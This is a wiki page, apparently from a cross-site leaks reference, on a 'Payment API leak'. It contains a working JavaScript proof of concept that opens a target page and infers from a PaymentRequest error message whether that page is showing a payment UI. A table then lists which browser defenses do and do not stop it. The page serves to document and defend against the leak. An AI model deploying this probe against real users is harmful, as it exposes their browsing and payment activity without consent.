+++
title = "Payment API leaks"
description = ""
category = "Attack"
abuse = []
defenses = []
menu = "main"
weight = 2
+++

## Detecting usage of Payment API
Because only one PaymentRequest UI is allowed to be visable the blocking can be detected.
```javascript
const applePayMethod = {
    supportedMethods: "https://apple.com/apple-pay",
    data: {
        version: 3,
        merchantIdentifier: "merchant.com.example",
        countryCode: "US",
        merchantCapabilities: ["supports3DS"],
        supportedNetworks: ["visa"],
    },
}

const methods = [{supportedMethods: "basic-card"}, applePayMethod];
const details = {
    total: {
        label: "Total",
        amount: {
            currency: "USD",
            value: "1.00",
        },
    },
}

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function paymentsUsage(url) {
    return new Promise(async (r) =>  {
        if (!window.PaymentRequest){
            return r('PaymentRequest not supported.');
        }
        let w = open(url);
        await sleep(2000);
        let request = new PaymentRequest(methods, details);
        request.show().catch((err) => {
                if(err.message == "Another PaymentRequest UI is already showing in a different tab or window.")
                    return r(1);
                else{
                    return r(0);
                }
            }
        )
        request.abort();
    });
    
}
```

## Defense

| [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
| :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
|                                         ❌                                         |                         ❌                          |                                ❌                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |
## References